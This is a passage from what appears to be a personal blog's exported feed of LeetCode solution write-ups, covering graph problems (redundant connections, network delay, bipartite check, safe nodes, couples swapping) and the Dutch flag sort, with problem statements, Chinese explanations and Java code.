<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edges.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> v = edges[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> w = edges[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(uf.connected(v, w)) &#123;</span><br><span class="line">                stack.push(edges[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> uf.union(v, w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack.isEmpty()) <span class="keyword">return</span> stack.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">WeightedQuickUnionUF</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] parent;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">WeightedQuickUnionUF</span> <span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">            count = n;</span><br><span class="line">            parent = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            size = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                parent[i] = i;</span><br><span class="line">                size[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> count;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (p != parent[p])</span><br><span class="line">                p = parent[p];</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span> <span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">            <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">            <span class="keyword">if</span> (rootP == rootQ) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// make smaller root point to larger one</span></span><br><span class="line">            <span class="keyword">if</span> (size[rootP] &lt; size[rootQ]) &#123;</span><br><span class="line">                parent[rootP] = rootQ;</span><br><span class="line">                size[rootQ] += size[rootP];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                parent[rootQ] = rootP;</span><br><span class="line">                size[rootP] += size[rootQ];</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
        <tag>union-find</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-685</title>
    <url>/2018/12/13/leetcode-685/</url>
    <content><![CDATA[<h1 id="Redundant-Connection-II"><a href="#Redundant-Connection-II" class="headerlink" title="Redundant Connection II"></a>Redundant Connection II</h1><p>In this problem, a rooted tree is a directed graph such that, there is exactly one node (the root) for which all other nodes are descendants of this node, plus every node has exactly one parent, except for the root node which has no parents.</p>
<p>The given input is a directed graph that started as a rooted tree with N nodes (with distinct values 1, 2, …, N), with one additional directed edge added. The added edge has two different vertices chosen from 1 to N, and was not an edge that already existed.</p>
<p>The resulting graph is given as a 2D-array of edges. Each element of edges is a pair [u, v] that represents a directed edge connecting nodes u and v, where u is a parent of child v.</p>
<a id="more"></a>
<p>Return an edge that can be removed so that the resulting graph is a rooted tree of N nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">Input: [[1,2], [1,3], [2,3]]</span><br><span class="line">Output: [2,3]</span><br><span class="line">Explanation: The given directed graph will be like this:</span><br><span class="line">  1</span><br><span class="line"> &#x2F; \</span><br><span class="line">v   v</span><br><span class="line">2--&gt;3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 2:</span><br><span class="line">Input: [[1,2], [2,3], [3,4], [4,1], [1,5]]</span><br><span class="line">Output: [4,1]</span><br><span class="line">Explanation: The given directed graph will be like this:</span><br><span class="line">5 &lt;- 1 -&gt; 2</span><br><span class="line">     ^    |</span><br><span class="line">     |    v</span><br><span class="line">     4 &lt;- 3</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The size of the input 2D-array will be between 3 and 1000.</li>
<li>Every integer represented in the 2D-array will be between 1 and N, where N is the size of the input array.</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>684的升级版，684只需要在无向图中寻找冗余边，而这个问题明确了父子关系，所以出现冗余边的情况有两种，一种是某个结点有两个parent，另一种情况是出现环路。依然采用union-find的策略。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findRedundantDirectedConnection(<span class="keyword">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] cand1 = &#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] cand2 = &#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] root = <span class="keyword">new</span> <span class="keyword">int</span>[edges.length + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span>[] edge : edges) &#123;</span><br><span class="line">            <span class="keyword">int</span> father = edge[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> son = edge[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(root[son] != <span class="number">0</span>) &#123;</span><br><span class="line">                cand1 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;root[son], son&#125;;</span><br><span class="line">                cand2 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;father, son&#125;;</span><br><span class="line">                <span class="comment">// 标记第二个边为invalid</span></span><br><span class="line">                edge[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                root[son] = father;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; root.length; i++)</span><br><span class="line">            root[i] = i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span>[] edge : edges) &#123;</span><br><span class="line">            <span class="keyword">int</span> father = edge[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> son = edge[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(edge[<span class="number">1</span>] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(find(root, father) == son) &#123;</span><br><span class="line">                <span class="keyword">if</span>(cand1[<span class="number">0</span>] == -<span class="number">1</span>) <span class="keyword">return</span> edge;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> cand1;</span><br><span class="line">            &#125;</span><br><span class="line">            root[son] = father;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cand2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] root, <span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(node != root[node])</span><br><span class="line">            node = root[node];</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
        <tag>union-find</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-743</title>
    <url>/2018/12/12/leetcode-743/</url>
    <content><![CDATA[<h1 id="Network-Delay-Time"><a href="#Network-Delay-Time" class="headerlink" title="Network Delay Time"></a>Network Delay Time</h1><p>There are N network nodes, labelled 1 to N.</p>
<p>Given times, a list of travel times as directed edges <code>times[i] = (u, v, w)</code>, where <code>u</code> is the source node, <code>v</code> is the target node, and <code>w</code> is the time it takes for a signal to travel from source to target.</p>
<p>Now, we send a signal from a certain node <code>K</code>. How long will it take for all nodes to receive the signal? If it is impossible, return -1.</p>
<a id="more"></a>
<p>Note:<br><code>N</code> will be in the range [1, 100].<br><code>K</code> will be in the range [1, N].<br>The length of times will be in the range [1, 6000].<br>All edges times<code>[i] = (u, v, w)</code> will have <code>1 &lt;= u</code>, <code>v &lt;= N</code> and <code>1 &lt;= w &lt;= 100</code>.</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>一点题外话：做到这个题的时候刚好做了一个关于网络层DV算法的项目，也比较凑巧的是，这个题和DV异曲同工的利用了Bellman-Ford方程。下面来分析以下题意，给定一个图，以及图中节点的数量，还有我们关注的K结点。我们要做的是找到这个图中距离K最远的距离，但这个距离还必须是最短距离，我称之为在最短中找最长问题。回忆一下Bellfor-Ford方程，说的是对于某一个结点来说，若关注结点K到该结点的距离已知，并且结点中存在一条边，使得我们可以经由这条边去结点K，如果当前距离大于经由这条边去结点K，那么我们更新该结点到结点K的距离。经过不断迭代，我们终于可以找到结点中所有点（如果是连通图）到结点K的最短距离。然后在所有最短距离中找到最长的距离，即为问题的解，如果图不连通，那么返回-1。外循环为V，内循环为E，时间复杂度为O（VE），V小于100，可以近似为O（E）。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">networkDelayTime</span><span class="params">(<span class="keyword">int</span>[][] times, <span class="keyword">int</span> N, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(times == <span class="keyword">null</span> || times.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 初始化一个dist数组表示所有结点到K结点的当前已知的最短距离</span></span><br><span class="line">        <span class="keyword">int</span>[] dist = <span class="keyword">new</span> <span class="keyword">int</span>[N+<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 初始状态下，除了K到自己为0，其余设置为MAX_VALUE</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">            dist[i] = Integer.MAX_VALUE;</span><br><span class="line">        dist[K] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 不断迭代直至找到所有最短距离</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span>[] items : times) &#123;</span><br><span class="line">                <span class="keyword">int</span> u = items[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">int</span> v = items[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> w = items[<span class="number">2</span>];</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(dist[u] != Integer.MAX_VALUE &amp;&amp; dist[v] &gt; dist[u] + w)</span><br><span class="line">                    dist[v] = dist[u] + w;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 遍历所有item，找到最大的距离，如果有一个不可达结点（图不连通），则返回-1</span></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">            max = Math.max(max, dist[i]);</span><br><span class="line">        <span class="keyword">if</span>(max == Integer.MAX_VALUE) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-75</title>
    <url>/2018/11/19/leetcode-75/</url>
    <content><![CDATA[<h1 id="Sort-colors"><a href="#Sort-colors" class="headerlink" title="Sort colors"></a>Sort colors</h1><p>Given an array with n objects colored red, white or blue, sort them in-place so that objects of the same color are adjacent, with the colors in the order red, white and blue.</p>
<p>Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.</p>
<p>Note: You are not suppose to use the library’s sort function for this problem.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [2,0,2,1,1,0]</span><br><span class="line">Output: [0,0,1,1,2,2]</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<p>A rather straight forward solution is a two-pass algorithm using counting sort.<br>First, iterate the array counting number of 0’s, 1’s, and 2’s, then overwrite array with total number of 0’s, then 1’s and followed by 2’s.<br>Could you come up with a one-pass algorithm using only constant space?</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>该题就是所谓的荷兰国旗问题，红白蓝三色排序。我们对数组进行遍历，将1当作pivot，类似快排。设定两个指针，lt和gt，若该数字为0，说明应在左侧，将lt和当前位置数字做交换。若该数字为1，说明数字大于pivot，则应与gt做交换。若相等，只需要继续遍历而不需要做交换。终止条件是遍历变量i大于gt，遍历完所有元素。由于只遍历数组，所以时间复杂度为O(n)。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> lt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> gt = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= gt)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">1</span>) swap(nums, i, gt--);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] &lt; <span class="number">1</span>) swap(nums, i++, lt++);</span><br><span class="line">            <span class="keyword">else</span> i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-765</title>
    <url>/2018/12/17/leetcode-765/</url>
    <content><![CDATA[<h1 id="Couples-Holding-Hands"><a href="#Couples-Holding-Hands" class="headerlink" title="Couples Holding Hands"></a>Couples Holding Hands</h1><p>N couples sit in 2N seats arranged in a row and want to hold hands. We want to know the minimum number of swaps so that every couple is sitting side by side. A swap consists of choosing any two people, then they stand up and switch seats.</p>
<p>The people and seats are represented by an integer from 0 to 2N-1, the couples are numbered in order, the first couple being (0, 1), the second couple being (2, 3), and so on with the last couple being (2N-2, 2N-1).</p>
<p>The couples’ initial seating is given by row[i] being the value of the person who is initially sitting in the i-th seat.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: row &#x3D; [0, 2, 1, 3]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Explanation: We only need to swap the second (row[1]) and third (row[2]) person.<br>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: row &#x3D; [3, 2, 0, 1]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>
<p>Explanation: All couples are already seated side by side.<br>Note:</p>
<ul>
<li>len(row) is even and in the range of [4, 60].</li>
<li>row is guaranteed to be a permutation of 0…len(row)-1.</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>给定一个row数组，代表每个座位做的人，0和1是情侣，2和3是情侣，我们最终的目标就是将情侣都安排到一起。这里采用贪心策略，首先判断是否相邻的两个已经是情侣关系，如果是继续扫描下一组，如果不是，就将第二个换成第一个的情侣，而我们怎么找到第一个人的情侣的位置呢，好让第二个做正确的交换，这里pos数组就登场啦。pos数组刚好是row数组的逆，所谓逆，就是将索引和值对调，也就是pos数组的索引是row数组的值，因为大家都是数字，且不重复，这一点可以很容易的达到，只需要遍历row数组即可。这里采用贪心的策略是因为我们的每次交换至少可以完成一对情侣，最好的情况可以使得两对情侣都坐在一起，所以算法正确性毋庸置疑。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSwapsCouples</span><span class="params">(<span class="keyword">int</span>[] row)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = row.length;</span><br><span class="line">        <span class="keyword">int</span>[] pos = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            pos[row[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = row[i] % <span class="number">2</span> == <span class="number">0</span> ? row[i] + <span class="number">1</span> : row[i] - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(row[i + <span class="number">1</span>] != j) &#123;</span><br><span class="line">                swap(row, pos, i + <span class="number">1</span>, pos[j]);</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] row, <span class="keyword">int</span>[] pos, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = row[i];</span><br><span class="line">        row[j] = row[i];</span><br><span class="line">        pos[row[j]] = i;</span><br><span class="line">        row[i] =temp;</span><br><span class="line">        pos[row[i]] = j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-785</title>
    <url>/2018/12/13/leetcode-785/</url>
    <content><![CDATA[<h1 id="IsBipartite"><a href="#IsBipartite" class="headerlink" title="IsBipartite"></a>IsBipartite</h1><p>Given an undirected graph, return true if and only if it is bipartite.</p>
<p>Recall that a graph is bipartite if we can split it’s set of nodes into two independent subsets A and B such that every edge in the graph has one node in A and another node in B.</p>
<p>The graph is given in the following form: graph[i] is a list of indexes j for which the edge between nodes i and j exists.  Each node is an integer between 0 and graph.length - 1.  There are no self edges or parallel edges: graph[i] does not contain i, and it doesn’t contain any element twice.</p>
<a id="more"></a>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [[1,3], [0,2], [1,3], [0,2]]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">The graph looks like this:</span><br><span class="line">0----1</span><br><span class="line">|    |</span><br><span class="line">|    |</span><br><span class="line">3----2</span><br><span class="line">We can divide the vertices into two groups: &#123;0, 2&#125; and &#123;1, 3&#125;.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 2:</span><br><span class="line">Input: [[1,2,3], [0,2], [0,1,3], [0,2]]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: </span><br><span class="line">The graph looks like this:</span><br><span class="line">0----1</span><br><span class="line">| \  |</span><br><span class="line">|  \ |</span><br><span class="line">3----2</span><br><span class="line">We cannot find a way to divide the set of nodes into two independent subsets.</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">- graph will have length in range [1, 100].</span><br><span class="line">- graph[i] will contain integers in range [0, graph.length - 1].</span><br><span class="line">- graph[i] will not contain i or duplicate values.</span><br><span class="line">- The graph is undirected: if any element j is in graph[i], then i will be in graph[j].</span><br><span class="line"></span><br><span class="line">## 题意分析</span><br><span class="line"></span><br><span class="line">这个问题是图论里面比较经典的问题：二分图(Bipartite)的判定。可以采用染色方法来解，基本思想还是DFS，我们去从每一个节点出发，DFS整个图，维护mark和color两个状态，mark表明我们已经到访的结点，color表明两种颜色，二分图就是要所有相邻的结点的颜色不同，但凡找到一个与这个特性矛盾的结点，就不是二分图。</span><br><span class="line"></span><br><span class="line">## 代码实现</span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line">class Solution &#123;</span><br><span class="line"></span><br><span class="line">    public boolean isBipartite(int[][] graph) &#123;</span><br><span class="line">        boolean[] mark &#x3D; new boolean[graph.length];</span><br><span class="line">        &#x2F;&#x2F; color的最后一个位置留作判定是否是二分图的判据</span><br><span class="line">        boolean[] color &#x3D; new boolean[graph.length + 1];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 可能是非连通图</span><br><span class="line">        for(int i &#x3D; 0; i &lt; graph.length; i++) &#123;</span><br><span class="line">            if(!mark[i]) dfs(graph, mark, color, i);</span><br><span class="line">            &#x2F;&#x2F; 如果最后一个位置为true，说明是二分图直接返回false</span><br><span class="line">            if(color[graph.length]) return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void dfs(int[][] graph, boolean[] mark, boolean[] color, int i) &#123;</span><br><span class="line">        &#x2F;&#x2F; 对当前访问的结点进行标记</span><br><span class="line">        mark[i] &#x3D; true;</span><br><span class="line">        &#x2F;&#x2F; 对相邻节点作dfs</span><br><span class="line">        for(int adj : graph[i]) &#123;</span><br><span class="line">            &#x2F;&#x2F; 没见过这个结点，将其颜色取反并dfs</span><br><span class="line">            if(!mark[adj]) &#123;</span><br><span class="line">                color[adj] &#x3D; !color[i];</span><br><span class="line">                dfs(graph, mark, color, adj);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 见过该结点并且颜色和当前结点相同就出现了矛盾的状况，不符合二分图特性</span><br><span class="line">            else if(color[adj] &#x3D;&#x3D; color[i]) &#123;</span><br><span class="line">                color[graph.length] &#x3D; true; return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是自己参考Algorithm书做出的解法，有一个小问题就是算法找到矛盾条件后还要继续dfs，看了下discuss区，top vote的解法比较通用也很巧妙，都是利用双色的思想，但是将dfs设置一个返回值，找到矛盾条件后便不继续遍历，直接返回。运行效率会有提升，以下是代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBipartite</span><span class="params">(<span class="keyword">int</span>[][] graph)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = graph.length;</span><br><span class="line">        <span class="keyword">int</span>[] colors = <span class="keyword">new</span> <span class="keyword">int</span>[n];			</span><br><span class="line">				</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;             </span><br><span class="line">            <span class="comment">//This graph might be a disconnected graph. So check each unvisited node.</span></span><br><span class="line">            <span class="keyword">if</span> (colors[i] == <span class="number">0</span> &amp;&amp; !validColor(graph, colors, <span class="number">1</span>, i)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validColor</span><span class="params">(<span class="keyword">int</span>[][] graph, <span class="keyword">int</span>[] colors, <span class="keyword">int</span> color, <span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (colors[node] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> colors[node] == color;</span><br><span class="line">        &#125;       </span><br><span class="line">        colors[node] = color;       </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> next : graph[node]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!validColor(graph, colors, -color, next)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>colors数组维护三种状态，0代表还没有访问到，1代表红色，-1代表蓝色。</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-802</title>
    <url>/2018/12/13/leetcode-802/</url>
    <content><![CDATA[<h1 id="EventualSafeNode"><a href="#EventualSafeNode" class="headerlink" title="EventualSafeNode"></a>EventualSafeNode</h1><p>In a directed graph, we start at some node and every turn, walk along a directed edge of the graph.  If we reach a node that is terminal (that is, it has no outgoing directed edges), we stop.</p>
<p>Now, say our starting node is eventually safe if and only if we must eventually walk to a terminal node.  More specifically, there exists a natural number K so that for any choice of where to walk, we must have stopped at a terminal node in less than K steps.</p>
<a id="more"></a>
<p>Which nodes are eventually safe?  Return them as an array in sorted order.</p>
<p>The directed graph has N nodes with labels 0, 1, …, N-1, where N is the length of graph.  The graph is given in the following form: graph[i] is a list of labels j such that (i, j) is a directed edge of the graph.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: graph &#x3D; [[1,2],[2,3],[5],[0],[5],[],[]]</span><br><span class="line">Output: [2,4,5,6]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>graph will have length at most 10000.</li>
<li>The number of edges in the graph will not exceed 32000.</li>
<li>Each graph[i] will be a sorted list of different integers, chosen within the range [0, graph.length - 1].</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>该题让我们找安全结点，所谓安全结点，就是在有向图中，从该点出发，绝不会走到一个环路，最终都会走到一个出度为0的结点。我们维护一个color数组，数值0表示还没访问，1表示不安全，2表示安全。采用dfs策略，我们初始都要设置结点为不安全，然后对邻居进行dfs，如果出现环路，表明我们将其设置为1是正确的，一路在递归调用栈中返回false就可以。如果dfs所有邻居还找不到一个环路，也就是我们没有遇到一个结点在递归调用栈上（，因为如果在dfs的过程中，遇到一个结点在调用栈上（就是为color对应项为1，那肯定出现环路。）我们就可以将对应结点设置为2，返回true。而在主调函数中，我们需要从每个结点出发去遍历图，如果返回true，则加入返回的list中。</p>
